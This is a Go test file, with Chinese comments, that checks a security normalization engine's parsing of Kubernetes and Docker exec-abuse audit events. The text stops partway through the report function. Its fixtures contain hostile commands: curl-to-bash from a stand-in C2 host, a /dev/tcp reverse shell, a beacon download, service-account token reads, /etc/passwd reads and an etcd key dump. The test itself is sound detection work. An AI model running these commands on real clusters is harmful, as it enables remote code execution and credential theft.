// exec_attack_test.go
// exec 函数滥用攻击场景测试方法论
//
// 测试目标：系统性验证 Kestrel 归一化引擎对 MITRE ATT&CK T1059.013
// （Container CLI/API）各类 exec 滥用攻击场景的检测能力。
//
// 方法论五层架构：
//   1. 攻击向量识别 - 基于 ATT&CK 战术映射，枚举 exec 滥用路径
//   2. 测试用例设计 - 针对每个向量构造真实遥测样本
//   3. 场景模拟执行 - 通过 service.Sidecar.Process 归一化
//   4. 成功标准验证 - 量化检测准确性、完整性、健壮性
//   5. 结果报告生成 - 结构化输出观察与缓解建议
//
// 运行方式：
//   go test ./test/ -run TestExecAttack -v
//   go test ./test/ -run TestExecAttackReport -v   # 仅生成汇总报告

package service_test

import (
	"fmt"
	"strings"
	"testing"

	"kestrel/internal/model"
	"kestrel/internal/service"
)

// attackVector 标识 exec 滥用的攻击向量类别。
// 每个 vector 对应一组 ATT&CK 战术组合。
type attackVector string

const (
	// K8s exec 攻击向量
	vectorAnonymousIntrusion   attackVector = "匿名入侵"           // T1059.013 + T1078.001
	vectorServiceAccountAbuse  attackVector = "服务账号滥用"        // T1059.013 + T1078.004
	vectorNodeCompromise       attackVector = "节点身份妥协"        // T1059.013 + T1078.001
	vectorDeniedExecBruteForce attackVector = "拒绝暴力尝试"        // T1059.013 + T1110
	vectorSensitiveCommand     attackVector = "敏感命令执行"        // T1059.013 + T1003/T1087
	vectorReverseShell         attackVector = "反向Shell"          // T1059.013 + T1059.004
	vectorC2Exfiltration       attackVector = "C2外联"             // T1059.013 + T1071
	vectorCredentialTheft      attackVector = "凭证窃取"           // T1059.013 + T1552
	vectorBatchAutomation      attackVector = "批量自动化"         // T1059.013 + T1020
	vectorCommandChain         attackVector = "命令链注入"         // T1059.013 + T1059.004
	vectorPrivilegeEscalation  attackVector = "kube-system提权"   // T1059.013 + T1068
	vectorPortForwardAbuse     attackVector = "端口转发滥用"       // T1059.013 + T1572

	// Docker exec 攻击向量
	vectorDockerAnonymousExec  attackVector = "Docker匿名exec"    // T1059.013 + T1078
	vectorDockerInteractiveAttach attackVector = "Docker交互式attach" // T1059.013

	// 健壮性测试向量
	vectorURLEncodedBypass attackVector = "URL编码绕过" // T1059.013 + T1027
	vectorEmptyCommand    attackVector = "空命令边缘" // 边界条件
	vectorMalformedJSON    attackVector = "畸形JSON健壮性" // 健壮性
)

// execScenario 封装单个 exec 攻击场景的完整定义。
type execScenario struct {
	ID          string        // 场景标识（EXEC-001 等）
	Name        string        // 场景名称
	Vector      attackVector  // 攻击向量
	Severity    string        // 严重度（高/中/低/信息）
	Description string        // 场景描述
	MITRE       string        // ATT&CK 战术映射
	Source      service.TelemetrySource
	Payload     []byte        // 原始遥测载荷
	Criteria    execCriteria  // 成功标准
}

// execCriteria 定义检测成功的量化标准。
// 每个字段对应归一化输出的一个验证点。
type execCriteria struct {
	EventCount   int                 // 预期归一化事件数（0 表示预期错误）
	ActionType   model.ActionType    // 预期动作类型
	IdentityType model.IdentityType  // 预期身份类型
	Command      string              // 预期提取的命令
	SkipCommand  bool                // 是否跳过命令验证（批量场景各事件命令不同）
	Interactive  *bool               // 预期交互式标志（nil 表示不验证）
	Denied       bool                // 预期 metadata[denied]=true
	Environment  string              // 预期环境推断
	Namespace    string              // 预期命名空间
	ExpectError  bool                // 是否预期归一化失败（健壮性测试）
}

// scenarioResult 记录单个场景的执行结果。
type scenarioResult struct {
	Scenario  execScenario
	Passed    bool
	Failures  []string // 失败原因列表
	Events    []model.Event
	Error     error
}

// attackReport 汇总所有场景的执行报告。
type attackReport struct {
	Results   []scenarioResult
	TotalPass int
	TotalFail int
}

// 全部 exec 攻击场景定义。
// 这些场景覆盖了 T1059.013 在 K8s 和 Docker 运行时下的所有主要滥用路径。
func execAttackScenarios() []execScenario {
	interactive := true
	nonInteractive := false

	return []execScenario{
		// ── K8s exec 攻击向量 ──────────────────────────────────

		{
			ID:          "EXEC-001",
			Name:        "匿名用户生产环境exec入侵",
			Vector:      vectorAnonymousIntrusion,
			Severity:    "高",
			Description: "未认证用户通过 kubectl exec 直接进入生产 Pod 执行 shell",
			MITRE:       "T1059.013 + T1078.001（有效账户：默认账户）",
			Source:      service.SourceK8sAudit,
			Payload: []byte(`{
				"kind": "Event",
				"apiVersion": "audit.k8s.io/v1",
				"level": "RequestResponse",
				"auditID": "exec-001",
				"stage": "ResponseComplete",
				"requestURI": "/api/v1/namespaces/production/pods/payment-svc/exec?command=/bin/sh",
				"verb": "create",
				"user": {
					"username": "system:anonymous",
					"uid": "",
					"groups": ["system:unauthenticated"]
				},
				"sourceIPs": ["203.0.113.50"],
				"userAgent": "kubectl/v1.28.0",
				"objectRef": {
					"resource": "pods",
					"namespace": "production",
					"name": "payment-svc",
					"subresource": "exec"
				},
				"responseStatus": {"code": 200},
				"stageTimestamp": "2026-08-14T03:00:00Z"
			}`),
			Criteria: execCriteria{
				EventCount:   1,
				ActionType:   model.ContainerExec,
				IdentityType: model.IdentityAnonymous,
				Command:      "/bin/sh",
				Interactive:  &interactive,
				Environment:  "production",
				Namespace:    "production",
			},
		},

		{
			ID:          "EXEC-002",
			Name:        "服务账号横向移动exec",
			Vector:      vectorServiceAccountAbuse,
			Severity:    "高",
			Description: "被妥协的 Service Account 通过 exec 在 Pod 间横向移动",
			MITRE:       "T1059.013 + T1078.004（有效账户：云账户）",
			Source:      service.SourceK8sAudit,
			Payload: []byte(`{
				"kind": "Event",
				"apiVersion": "audit.k8s.io/v1",
				"level": "Request",
				"auditID": "exec-002",
				"stage": "ResponseComplete",
				"requestURI": "/api/v1/namespaces/default/pods/worker/exec?command=curl&command=http://c2.evil.com/payload&command=|&command=bash",
				"verb": "create",
				"user": {
					"username": "system:serviceaccount:default:deploy-bot",
					"uid": "sa-67890",
					"groups": ["system:serviceaccounts", "system:authenticated"]
				},
				"sourceIPs": ["10.0.1.10"],
				"userAgent": "kubectl/v1.28.0",
				"objectRef": {
					"resource": "pods",
					"namespace": "default",
					"name": "worker",
					"subresource": "exec"
				},
				"responseStatus": {"code": 200},
				"stageTimestamp": "2026-08-14T03:02:00Z"
			}`),
			Criteria: execCriteria{
				EventCount:   1,
				ActionType:   model.ContainerExec,
				IdentityType: model.IdentityServiceAccount,
				Command:      "curl http://c2.evil.com/payload | bash",
				Interactive:  &interactive,
				Namespace:    "default",
			},
		},

		{
			ID:          "EXEC-003",
			Name:        "节点身份kube-system渗透",
			Vector:      vectorNodeCompromise,
			Severity:    "高",
			Description: "kubelet 节点身份被滥用，exec 进入 kube-system 核心组件",
			MITRE:       "T1059.013 + T1078.001 + T1068（利用漏洞提权）",
			Source:      service.SourceK8sAudit,
			Payload: []byte(`{
				"kind": "Event",
				"apiVersion": "audit.k8s.io/v1",
				"level": "Request",
				"auditID": "exec-003",
				"stage": "ResponseComplete",
				"requestURI": "/api/v1/namespaces/kube-system/pods/kube-proxy/exec?command=/bin/true",
				"verb": "create",
				"user": {
					"username": "system:node:worker-1",
					"uid": "node-1",
					"groups": ["system:nodes", "system:authenticated"]
				},
				"sourceIPs": ["10.0.0.3"],
				"objectRef": {
					"resource": "pods",
					"namespace": "kube-system",
					"name": "kube-proxy",
					"subresource": "exec"
				},
				"responseStatus": {"code": 200},
				"stageTimestamp": "2026-08-14T03:04:00Z"
			}`),
			Criteria: execCriteria{
				EventCount:   1,
				ActionType:   model.ContainerExec,
				IdentityType: model.IdentityNode,
				Command:      "/bin/true",
				Interactive:  &interactive,
				Namespace:    "kube-system",
			},
		},

		{
			ID:          "EXEC-004",
			Name:        "被拒绝的exec暴力尝试",
			Vector:      vectorDeniedExecBruteForce,
			Severity:    "中",
			Description: "攻击者反复尝试 exec，RBAC 拒绝（403），可能是暴力枚举或权限探测",
			MITRE:       "T1059.013 + T1110（暴力破解）",
			Source:      service.SourceK8sAudit,
			Payload: []byte(`{
				"kind": "Event",
				"apiVersion": "audit.k8s.io/v1",
				"level": "Request",
				"auditID": "exec-004",
				"stage": "ResponseComplete",
				"requestURI": "/api/v1/namespaces/production/pods/payment-svc/exec?command=/bin/bash",
				"verb": "create",
				"user": {
					"username": "dev-bob",
					"uid": "u-bob",
					"groups": ["system:authenticated"]
				},
				"sourceIPs": ["10.0.0.20"],
				"userAgent": "kubectl/v1.28.0",
				"objectRef": {
					"resource": "pods",
					"namespace": "production",
					"name": "payment-svc",
					"subresource": "exec"
				},
				"responseStatus": {"code": 403, "reason": "Forbidden"},
				"stageTimestamp": "2026-08-14T03:05:00Z"
			}`),
			Criteria: execCriteria{
				EventCount:   1,
				ActionType:   model.ContainerExec,
				IdentityType: model.IdentityUser,
				Command:      "/bin/bash",
				Interactive:  &interactive,
				Denied:       true,
				Namespace:    "production",
			},
		},

		{
			ID:          "EXEC-005",
			Name:        "敏感命令执行凭证窃取",
			Vector:      vectorSensitiveCommand,
			Severity:    "高",
			Description: "通过 exec 读取 /etc/passwd 等敏感系统文件",
			MITRE:       "T1059.013 + T1003（操作系统凭证转储）+ T1087（账户发现）",
			Source:      service.SourceK8sAudit,
			Payload: []byte(`{
				"kind": "Event",
				"apiVersion": "audit.k8s.io/v1",
				"level": "Request",
				"auditID": "exec-005",
				"stage": "ResponseComplete",
				"requestURI": "/api/v1/namespaces/default/pods/web/exec?command=/bin/sh&command=-c&command=cat%20/etc/passwd",
				"verb": "create",
				"user": {
					"username": "attacker",
					"uid": "u-evil",
					"groups": ["system:authenticated"]
				},
				"sourceIPs": ["203.0.113.99"],
				"objectRef": {
					"resource": "pods",
					"namespace": "default",
					"name": "web",
					"subresource": "exec"
				},
				"responseStatus": {"code": 200},
				"stageTimestamp": "2026-08-14T03:06:00Z"
			}`),
			Criteria: execCriteria{
				EventCount:   1,
				ActionType:   model.ContainerExec,
				IdentityType: model.IdentityUser,
				Command:      "/bin/sh -c cat /etc/passwd",
				Interactive:  &interactive,
				Namespace:    "default",
			},
		},

		{
			ID:          "EXEC-006",
			Name:        "反向Shell建立持久通道",
			Vector:      vectorReverseShell,
			Severity:    "高",
			Description: "通过 exec 建立反向 shell 连接，绕过网络策略",
			MITRE:       "T1059.013 + T1059.004（Unix Shell）",
			Source:      service.SourceK8sAudit,
			Payload: []byte(`{
				"kind": "Event",
				"apiVersion": "audit.k8s.io/v1",
				"level": "Request",
				"auditID": "exec-006",
				"stage": "ResponseComplete",
				"requestURI": "/api/v1/namespaces/default/pods/exploit/exec?command=bash&command=-c&command=bash%20-i%20%3E%26%20/dev/tcp/10.0.0.5/4444%200%3E%261",
				"verb": "create",
				"user": {
					"username": "attacker",
					"uid": "u-evil",
					"groups": ["system:authenticated"]
				},
				"sourceIPs": ["203.0.113.99"],
				"objectRef": {
					"resource": "pods",
					"namespace": "default",
					"name": "exploit",
					"subresource": "exec"
				},
				"responseStatus": {"code": 200},
				"stageTimestamp": "2026-08-14T03:07:00Z"
			}`),
			Criteria: execCriteria{
				EventCount:   1,
				ActionType:   model.ContainerExec,
				IdentityType: model.IdentityUser,
				Command:      "bash -c bash -i >& /dev/tcp/10.0.0.5/4444 0>&1",
				Interactive:  &interactive,
				Namespace:    "default",
			},
		},

		{
			ID:          "EXEC-007",
			Name:        "C2外联命令执行",
			Vector:      vectorC2Exfiltration,
			Severity:    "高",
			Description: "通过 exec 执行 curl/wget 连接 C2 服务器下载后续载荷",
			MITRE:       "T1059.013 + T1071（应用层协议）",
			Source:      service.SourceK8sAudit,
			Payload: []byte(`{
				"kind": "Event",
				"apiVersion": "audit.k8s.io/v1",
				"level": "Request",
				"auditID": "exec-007",
				"stage": "ResponseComplete",
				"requestURI": "/api/v1/namespaces/staging/pods/api-svc/exec?command=wget&command=http://c2.attacker.com/beacon&command=-O&command=/tmp/beacon.sh",
				"verb": "create",
				"user": {
					"username": "sre-alice",
					"uid": "u-12345",
					"groups": ["system:authenticated", "sre-team"]
				},
				"sourceIPs": ["10.0.0.5"],
				"objectRef": {
					"resource": "pods",
					"namespace": "staging",
					"name": "api-svc",
					"subresource": "exec"
				},
				"responseStatus": {"code": 200},
				"stageTimestamp": "2026-08-14T03:08:00Z"
			}`),
			Criteria: execCriteria{
				EventCount:   1,
				ActionType:   model.ContainerExec,
				IdentityType: model.IdentityUser,
				Command:      "wget http://c2.attacker.com/beacon -O /tmp/beacon.sh",
				Interactive:  &interactive,
				Environment:  "staging",
				Namespace:    "staging",
			},
		},

		{
			ID:          "EXEC-008",
			Name:        "K8s服务账号Token窃取",
			Vector:      vectorCredentialTheft,
			Severity:    "高",
			Description: "通过 exec 读取挂载的 Service Account Token 进行凭证窃取",
			MITRE:       "T1059.013 + T1552（未加密凭证）",
			Source:      service.SourceK8sAudit,
			Payload: []byte(`{
				"kind": "Event",
				"apiVersion": "audit.k8s.io/v1",
				"level": "Request",
				"auditID": "exec-008",
				"stage": "ResponseComplete",
				"requestURI": "/api/v1/namespaces/default/pods/web/exec?command=cat&command=/var/run/secrets/kubernetes.io/serviceaccount/token",
				"verb": "create",
				"user": {
					"username": "system:serviceaccount:default:app-sa",
					"uid": "sa-app",
					"groups": ["system:serviceaccounts", "system:authenticated"]
				},
				"sourceIPs": ["10.0.0.8"],
				"objectRef": {
					"resource": "pods",
					"namespace": "default",
					"name": "web",
					"subresource": "exec"
				},
				"responseStatus": {"code": 200},
				"stageTimestamp": "2026-08-14T03:09:00Z"
			}`),
			Criteria: execCriteria{
				EventCount:   1,
				ActionType:   model.ContainerExec,
				IdentityType: model.IdentityServiceAccount,
				Command:      "cat /var/run/secrets/kubernetes.io/serviceaccount/token",
				Interactive:  &interactive,
				Namespace:    "default",
			},
		},

		{
			ID:          "EXEC-009",
			Name:        "批量exec自动化攻击",
			Vector:      vectorBatchAutomation,
			Severity:    "高",
			Description: "攻击者通过 JSON 数组批量提交 exec 请求，实现自动化横向移动",
			MITRE:       "T1059.013 + T1020（自动外传）",
			Source:      service.SourceK8sAudit,
			Payload: []byte(`[
				{
					"kind": "Event",
					"apiVersion": "audit.k8s.io/v1",
					"auditID": "exec-009a",
					"stage": "ResponseComplete",
					"requestURI": "/api/v1/namespaces/default/pods/p1/exec?command=ls",
					"verb": "create",
					"user": {"username": "attacker", "uid": "u-evil", "groups": ["system:authenticated"]},
					"sourceIPs": ["203.0.113.99"],
					"objectRef": {"resource": "pods", "namespace": "default", "name": "p1", "subresource": "exec"},
					"responseStatus": {"code": 200},
					"stageTimestamp": "2026-08-14T03:10:00Z"
				},
				{
					"kind": "Event",
					"apiVersion": "audit.k8s.io/v1",
					"auditID": "exec-009b",
					"stage": "ResponseComplete",
					"requestURI": "/api/v1/namespaces/default/pods/p2/exec?command=whoami",
					"verb": "create",
					"user": {"username": "attacker", "uid": "u-evil", "groups": ["system:authenticated"]},
					"sourceIPs": ["203.0.113.99"],
					"objectRef": {"resource": "pods", "namespace": "default", "name": "p2", "subresource": "exec"},
					"responseStatus": {"code": 200},
					"stageTimestamp": "2026-08-14T03:10:01Z"
				},
				{
					"kind": "Event",
					"apiVersion": "audit.k8s.io/v1",
					"auditID": "exec-009c",
					"stage": "ResponseComplete",
					"requestURI": "/api/v1/namespaces/default/pods/p3/exec?command=id",
					"verb": "create",
					"user": {"username": "attacker", "uid": "u-evil", "groups": ["system:authenticated"]},
					"sourceIPs": ["203.0.113.99"],
					"objectRef": {"resource": "pods", "namespace": "default", "name": "p3", "subresource": "exec"},
					"responseStatus": {"code": 200},
					"stageTimestamp": "2026-08-14T03:10:02Z"
				}
			]`),
			Criteria: execCriteria{
				EventCount:   3,
				ActionType:   model.ContainerExec,
				IdentityType: model.IdentityUser,
				SkipCommand:  true,
				Namespace:    "default",
			},
		},

		{
			ID:          "EXEC-010",
			Name:        "命令链注入单次exec",
			Vector:      vectorCommandChain,
			Severity:    "高",
			Description: "通过单个 exec 执行命令链，组合多个攻击动作",
			MITRE:       "T1059.013 + T1059.004（Unix Shell）",
			Source:      service.SourceK8sAudit,
			Payload: []byte(`{
				"kind": "Event",
				"apiVersion": "audit.k8s.io/v1",
				"level": "Request",
				"auditID": "exec-010",
				"stage": "ResponseComplete",
				"requestURI": "/api/v1/namespaces/default/pods/foo/exec?command=/bin/sh&command=-c&command=whoami%3B%20id%3B%20cat%20/etc/passwd",
				"verb": "create",
				"user": {
					"username": "attacker",
					"uid": "u-evil",
					"groups": ["system:authenticated"]
				},
				"sourceIPs": ["203.0.113.99"],
				"objectRef": {
					"resource": "pods",
					"namespace": "default",
					"name": "foo",
					"subresource": "exec"
				},
				"responseStatus": {"code": 200},
				"stageTimestamp": "2026-08-14T03:11:00Z"
			}`),
			Criteria: execCriteria{
				EventCount:   1,
				ActionType:   model.ContainerExec,
				IdentityType: model.IdentityUser,
				Command:      "/bin/sh -c whoami; id; cat /etc/passwd",
				Interactive:  &interactive,
				Namespace:    "default",
			},
		},

		{
			ID:          "EXEC-011",
			Name:        "kube-system命名空间提权exec",
			Vector:      vectorPrivilegeEscalation,
			Severity:    "高",
			Description: "针对 kube-system 命名空间核心组件的 exec，可能意图提权或破坏",
			MITRE:       "T1059.013 + T1068（利用漏洞提权）",
			Source:      service.SourceK8sAudit,
			Payload: []byte(`{
				"kind": "Event",
				"apiVersion": "audit.k8s.io/v1",
				"level": "Request",
				"auditID": "exec-011",
				"stage": "ResponseComplete",
				"requestURI": "/api/v1/namespaces/kube-system/pods/etcd-master/exec?command=/bin/sh&command=-c&command=etcdctl%20get%20/%20--prefix%20--keys-only",
				"verb": "create",
				"user": {
					"username": "system:serviceaccount:kube-system:cluster-admin",
					"uid": "sa-cluster-admin",
					"groups": ["system:masters", "system:authenticated"]
				},
				"sourceIPs": ["10.0.0.99"],
				"objectRef": {
					"resource": "pods",
					"namespace": "kube-system",
					"name": "etcd-master",
					"subresource": "exec"
				},
				"responseStatus": {"code": 200},
				"stageTimestamp": "2026-08-14T03:12:00Z"
			}`),
			Criteria: execCriteria{
				EventCount:   1,
				ActionType:   model.ContainerExec,
				IdentityType: model.IdentityServiceAccount,
				Command:      "/bin/sh -c etcdctl get / --prefix --keys-only",
				Interactive:  &interactive,
				Namespace:    "kube-system",
			},
		},

		{
			ID:          "EXEC-012",
			Name:        "portforward子资源滥用",
			Vector:      vectorPortForwardAbuse,
			Severity:    "中",
			Description: "通过 portforward 子资源建立隧道，绕过网络策略访问内部服务",
			MITRE:       "T1059.013 + T1572（协议隧道）",
			Source:      service.SourceK8sAudit,
			Payload: []byte(`{
				"kind": "Event",
				"apiVersion": "audit.k8s.io/v1",
				"level": "Request",
				"auditID": "exec-012",
				"stage": "ResponseComplete",
				"requestURI": "/api/v1/namespaces/default/pods/database/portforward",
				"verb": "create",
				"user": {
					"username": "dev-charlie",
					"uid": "u-charlie",
					"groups": ["system:authenticated"]
				},
				"sourceIPs": ["10.0.0.15"],
				"objectRef": {
					"resource": "pods",
					"namespace": "default",
					"name": "database",
					"subresource": "portforward"
				},
				"responseStatus": {"code": 200},
				"stageTimestamp": "2026-08-14T03:13:00Z"
			}`),
			Criteria: execCriteria{
				EventCount:   1,
				ActionType:   model.NetworkConnect,
				IdentityType: model.IdentityUser,
				Namespace:    "default",
			},
		},

		// ── Docker exec 攻击向量 ───────────────────────────────

		{
			ID:          "EXEC-013",
			Name:        "Docker exec_create匿名告警",
			Vector:      vectorDockerAnonymousExec,
			Severity:    "高",
			Description: "Docker exec_create 事件缺失用户身份，保守标记为 anonymous 以提高警觉",
			MITRE:       "T1059.013 + T1078（有效账户）",
			Source:      service.SourceDocker,
			Payload: []byte(`{
				"Type": "container",
				"Action": "exec_create",
				"Actor": {
					"ID": "ctr-abc123",
					"Attributes": {
						"name": "compromised-container",
						"image": "nginx:latest"
					}
				},
				"scope": "local",
				"time": 1723606800,
				"timeNano": 1723606800000000000
			}`),
			Criteria: execCriteria{
				EventCount:   1,
				ActionType:   model.ContainerExec,
				IdentityType: model.IdentityAnonymous,
				Interactive:  &nonInteractive,
			},
		},

		{
			ID:          "EXEC-014",
			Name:        "Docker exec_start执行确认",
			Vector:      vectorDockerAnonymousExec,
			Severity:    "高",
			Description: "Docker exec_start 表示 exec 会话已开始执行，是攻击成功的确认信号",
			MITRE:       "T1059.013",
			Source:      service.SourceDocker,
			Payload: []byte(`{
				"Type": "container",
				"Action": "exec_start",
				"Actor": {
					"ID": "ctr-def456",
					"Attributes": {
						"name": "web-server",
						"image": "python:3.11"
					}
				},
				"scope": "local",
				"time": 1723606900
			}`),
			Criteria: execCriteria{
				EventCount:   1,
				ActionType:   model.ContainerExec,
				IdentityType: model.IdentityAnonymous,
				Interactive:  &nonInteractive,
			},
		},

		{
			ID:          "EXEC-015",
			Name:        "Docker attach交互式会话",
			Vector:      vectorDockerInteractiveAttach,
			Severity:    "中",
			Description: "Docker attach 建立交互式会话，可能用于手动操控容器",
			MITRE:       "T1059.013",
			Source:      service.SourceDocker,
			Payload: []byte(`{
				"Type": "container",
				"Action": "attach",
				"Actor": {
					"ID": "ctr-ghi789",
					"Attributes": {
						"name": "worker",
						"image": "busybox"
					}
				},
				"scope": "local",
				"time": 1723607000
			}`),
			Criteria: execCriteria{
				EventCount:   1,
				ActionType:   model.ContainerExec,
				IdentityType: model.IdentityAnonymous,
				Interactive:  &interactive,
			},
		},

		// ── 健壮性与边缘情况 ───────────────────────────────────

		{
			ID:          "EXEC-016",
			Name:        "URL编码命令绕过检测",
			Vector:      vectorURLEncodedBypass,
			Severity:    "中",
			Description: "攻击者使用 URL 编码隐藏命令内容，验证归一化是否正确解码",
			MITRE:       "T1059.013 + T1027（混淆文件或信息）",
			Source:      service.SourceK8sAudit,
			Payload: []byte(`{
				"kind": "Event",
				"apiVersion": "audit.k8s.io/v1",
				"level": "Request",
				"auditID": "exec-016",
				"stage": "ResponseComplete",
				"requestURI": "/api/v1/namespaces/default/pods/foo/exec?command=cat%20%2Fetc%2Fpasswd",
				"verb": "create",
				"user": {
					"username": "attacker",
					"uid": "u-evil",
					"groups": ["system:authenticated"]
				},
				"sourceIPs": ["203.0.113.99"],
				"objectRef": {
					"resource": "pods",
					"namespace": "default",
					"name": "foo",
					"subresource": "exec"
				},
				"responseStatus": {"code": 200},
				"stageTimestamp": "2026-08-14T03:15:00Z"
			}`),
			Criteria: execCriteria{
				EventCount:   1,
				ActionType:   model.ContainerExec,
				IdentityType: model.IdentityUser,
				Command:      "cat /etc/passwd",
				Interactive:  &interactive,
				Namespace:    "default",
			},
		},

		{
			ID:          "EXEC-017",
			Name:        "空命令exec边缘情况",
			Vector:      vectorEmptyCommand,
			Severity:    "信息",
			Description: "exec 请求未携带 command 参数，可能是交互式手动会话，需保留 ActionType",
			MITRE:       "T1059.013（边界条件）",
			Source:      service.SourceK8sAudit,
			Payload: []byte(`{
				"kind": "Event",
				"apiVersion": "audit.k8s.io/v1",
				"level": "Request",
				"auditID": "exec-017",
				"stage": "ResponseComplete",
				"requestURI": "/api/v1/namespaces/default/pods/foo/exec",
				"verb": "create",
				"user": {
					"username": "sre-alice",
					"uid": "u-12345",
					"groups": ["system:authenticated"]
				},
				"sourceIPs": ["10.0.0.5"],
				"objectRef": {
					"resource": "pods",
					"namespace": "default",
					"name": "foo",
					"subresource": "exec"
				},
				"responseStatus": {"code": 200},
				"stageTimestamp": "2026-08-14T03:16:00Z"
			}`),
			Criteria: execCriteria{
				EventCount:   1,
				ActionType:   model.ContainerExec,
				IdentityType: model.IdentityUser,
				Command:      "",
				Interactive:  &interactive,
				Namespace:    "default",
			},
		},

		{
			ID:          "EXEC-018",
			Name:        "畸形JSON健壮性验证",
			Vector:      vectorMalformedJSON,
			Severity:    "信息",
			Description: "传入损坏的 JSON，验证引擎不崩溃并返回明确错误",
			MITRE:       "T1059.013（健壮性）",
			Source:      service.SourceK8sAudit,
			Payload:     []byte(`{broken json`),
			Criteria: execCriteria{
				EventCount:  0,
				ExpectError: true,
			},
		},

		{
			ID:          "EXEC-019",
			Name:        "空载荷健壮性验证",
			Vector:      vectorMalformedJSON,
			Severity:    "信息",
			Description: "传入空字节流，验证引擎返回明确错误而非 panic",
			MITRE:       "T1059.013（健壮性）",
			Source:      service.SourceK8sAudit,
			Payload:     []byte(``),
			Criteria: execCriteria{
				EventCount:  0,
				ExpectError: true,
			},
		},

		{
			ID:          "EXEC-020",
			Name:        "Docker畸形JSON健壮性验证",
			Vector:      vectorMalformedJSON,
			Severity:    "信息",
			Description: "Docker 事件传入损坏的 JSON，验证引擎不崩溃",
			MITRE:       "T1059.013（健壮性）",
			Source:      service.SourceDocker,
			Payload:     []byte(`{invalid`),
			Criteria: execCriteria{
				EventCount:  0,
				ExpectError: true,
			},
		},
	}
}

// runExecScenario 执行单个 exec 攻击场景并验证成功标准。
// 返回 scenarioResult 包含通过/失败状态和详细失败原因。
func runExecScenario(t *testing.T, sc execScenario) scenarioResult {
	t.Helper()

	res := scenarioResult{Scenario: sc}

	s := service.New("test-cluster", nil)
	events, err := s.Process(sc.Payload, sc.Source)
	res.Events = events
	res.Error = err

	// 健壮性测试：预期失败的场景。
	if sc.Criteria.ExpectError {
		if err == nil {
			res.Failures = append(res.Failures, "预期返回错误但实际成功")
			return res
		}
		res.Passed = true
		return res
	}

	// 非健壮性测试：预期成功。
	if err != nil {
		res.Failures = append(res.Failures, fmt.Sprintf("归一化失败: %v", err))
		return res
	}

	// 验证事件数量。
	if len(events) != sc.Criteria.EventCount {
		res.Failures = append(res.Failures,
			fmt.Sprintf("事件数量: 预期 %d, 实际 %d", sc.Criteria.EventCount, len(events)))
		return res
	}

	// 批量场景只验证第一个事件的公共字段。
	for i, ev := range events {
		prefix := ""
		if sc.Criteria.EventCount > 1 {
			prefix = fmt.Sprintf("事件[%d] ", i)
		}

		// 验证动作类型。
		if ev.Action.Type != sc.Criteria.ActionType {
			res.Failures = append(res.Failures,
				fmt.Sprintf("%s动作类型: 预期 %s, 实际 %s",
					prefix, sc.Criteria.ActionType, ev.Action.Type))
		}

		// 验证身份类型。
		if ev.Actor.IdentityType != sc.Criteria.IdentityType {
			res.Failures = append(res.Failures,
				fmt.Sprintf("%s身份类型: 预期 %s, 实际 %s",
					prefix, sc.Criteria.IdentityType, ev.Actor.IdentityType))
		}

		// 验证命令提取（仅对第一个事件验证，批量场景跳过）。
		if i == 0 && !sc.Criteria.SkipCommand {
			if ev.Action.Command != sc.Criteria.Command {
				res.Failures = append(res.Failures,
					fmt.Sprintf("%s命令提取: 预期 %q, 实际 %q",
						prefix, sc.Criteria.Command, ev.Action.Command))
			}
		}

		// 验证交互式标志。
		if sc.Criteria.Interactive != nil {
			if ev.Action.Interactive != *sc.Criteria.Interactive {
				res.Failures = append(res.Failures,
					fmt.Sprintf("%s交互式标志: 预期 %v, 实际 %v",
						prefix, *sc.Criteria.Interactive, ev.Action.Interactive))
			}
		}

		// 验证命名空间。
		if sc.Criteria.Namespace != "" {
			if ev.Target.Namespace != sc.Criteria.Namespace {
				res.Failures = append(res.Failures,
					fmt.Sprintf("%s命名空间: 预期 %s, 实际 %s",
						prefix, sc.Criteria.Namespace, ev.Target.Namespace))
			}
		}

		// 验证环境推断。
		if sc.Criteria.Environment != "" {
			if ev.Metadata["environment"] != sc.Criteria.Environment {
				res.Failures = append(res.Failures,
					fmt.Sprintf("%s环境推断: 预期 %s, 实际 %s",
						prefix, sc.Criteria.Environment, ev.Metadata["environment"]))
			}
		}

		// 验证拒绝标志。
		if sc.Criteria.Denied {
			if ev.Metadata["denied"] != "true" {
				res.Failures = append(res.Failures,
					fmt.Sprintf("%s拒绝标志: 预期 denied=true, 实际 %q",
						prefix, ev.Metadata["denied"]))
			}
		}
	}

	if len(res.Failures) == 0 {
		res.Passed = true
	}

	return res
}

// TestExecAttackScenarios 是主测试入口，遍历所有 exec 攻击场景并验证。
// 每个场景作为独立子测试运行，便于定位失败。
func TestExecAttackScenarios(t *testing.T) {
	scenarios := execAttackScenarios()

	for _, sc := range scenarios {
		sc := sc // 捕获循环变量。
		t.Run(sc.ID+"_"+sc.Name, func(t *testing.T) {
			res := runExecScenario(t, sc)
			if !res.Passed {
				t.Errorf("场景 %s 失败:\n  %s",
					sc.ID, strings.Join(res.Failures, "\n  "))
			} else {
				t.Logf("场景 %s 通过 [%s]", sc.ID, sc.Vector)
			}
		})
	}
}

// TestExecAttackReport 生成 exec 攻击测试的汇总报告。
// 运行所有场景，输出结构化结果、统计信息和缓解建议。
// 适合用于 CI/CD 流水线的质量门禁。
func TestExecAttackReport(t *testing.T) {
	scenarios := execAttackScenarios()
	report := attackReport{}

	t.Log("开始执行 exec 攻击场景测试套件...")

	for _, sc := range scenarios {
		res := runExecScenario(t, sc)
		report.Results = append(report.Results, res)
		if res.Passed {
			report.TotalPass++
		} else {
			report.TotalFail++
		}
	}

	printExecAttackReport(t, report)
}

// printExecAttackReport 输出结构化的 exec 攻击测试报告。
// 报告包含：场景明细、统计摘要、攻击向量覆盖、缓解建议。
func printExecAttackReport(t *testing.T, report attackReport) {
	t.Helper()

	t.Log("")
	t.Log("============================================================")
	t.Log("            exec 攻击场景检测验证报告")
	t.Log("============================================================")
	t.Log("")

	// 场景明细
	t.Log("【场景明细】")
	t.Log("")

	for _, res := range report.Results {
		sc := res.Scenario
		status := "PASS"
		if !res.Passed {
			status = "FAIL"
		}

		t.Logf("[%s] %s | %s | 严重度: %s | 向量: %s",
			status, sc.ID, sc.Name, sc.Severity, sc.Vector)
		t.Logf("  描述: %s", sc.Description)
		t.Logf("  MITRE: %s", sc.MITRE)

		if !res.Passed {
			for _, f := range res.Failures {
				t.Logf("  失败原因: %s", f)
			}
		}
		t.Log("")
	}

	// 统计摘要
	t.Log("【统计摘要】")
	t.Logf("  总场景数: %d", len(report.Results))
	t.Logf("  通过: %d", report.TotalPass)
	t.Logf("  失败: %d", report.TotalFail)
	passRate := 0.0
	if len(report.Results) > 0 {
		passRate = float64(report.TotalPass) / float64(len(report.Results)) * 100
	}
